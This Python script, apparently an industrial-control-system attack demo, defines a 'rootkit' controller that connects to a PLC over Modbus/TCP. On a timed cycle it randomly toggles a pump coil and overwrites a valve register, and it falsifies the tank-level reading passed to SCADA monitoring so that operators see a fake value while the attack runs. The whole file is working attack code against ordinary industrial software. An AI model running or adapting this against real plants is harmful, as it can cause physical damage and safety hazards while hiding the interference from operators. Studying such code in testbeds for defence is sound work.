import asyncio
import random
import time
from pymodbus.server.async_io import StartTcpServer
from pymodbus.client import ModbusTcpClient
from pymodbus.datastore import ModbusSlaveContext, ModbusServerContext

PLC_IP = "192.168.1.20"
PLC_PORT = 502

ATTACK_INTERVAL = 20
ATTACK_DURATION = 8

class RootkitController:

    def __init__(self):
        self.client = ModbusTcpClient(PLC_IP, port=PLC_PORT)
        self.attack_active = False
        self.last_attack = time.time()
        self.fake_level = 50

    def connect(self):
        print("[+] Connecting to PLC")
        self.client.connect()

    def check_attack_cycle(self):

        now = time.time()

        if not self.attack_active and now - self.last_attack > ATTACK_INTERVAL:
            print("[ROOTKIT] Activating attack")
            self.attack_active = True
            self.attack_start = now

        if self.attack_active and now - self.attack_start > ATTACK_DURATION:
            print("[ROOTKIT] Attack ended")
            self.attack_active = False
            self.last_attack = now

    def manipulate_actuators(self):

        if not self.attack_active:
            return

        # oscillate pump
        state = random.choice([True, False])
        print("[ROOTKIT] Pump override:", state)
        self.client.write_coil(0, state)

        # random valve manipulation
        valve = random.randint(20,160)
        print("[ROOTKIT] Valve override:", valve)
        self.client.write_register(1, valve)

    def falsify_sensor(self, real_value):

        if not self.attack_active:
            return real_value

        print("[ROOTKIT] Falsifying tank level")

        return self.fake_level


rootkit = RootkitController()
rootkit.connect()


async def rootkit_loop():

    while True:

        rootkit.check_attack_cycle()

        if rootkit.attack_active:
            rootkit.manipulate_actuators()

        await asyncio.sleep(2)


async def scada_response_filter(level):

    fake = rootkit.falsify_sensor(level)
    return fake


async def telemetry_monitor():

    while True:

        rr = rootkit.client.read_holding_registers(0,2)

        if rr:

            level = rr.registers[0]
            valve = rr.registers[1]

            fake_level = await scada_response_filter(level)

            print("REAL LEVEL:", level)
            print("FAKE LEVEL:", fake_level)
            print("VALVE:", valve)

        await asyncio.sleep(3)


async def main():

    await asyncio.gather(
        rootkit_loop(),
        telemetry_monitor()
    )


if __name__ == "__main__":
    asyncio.run(main())
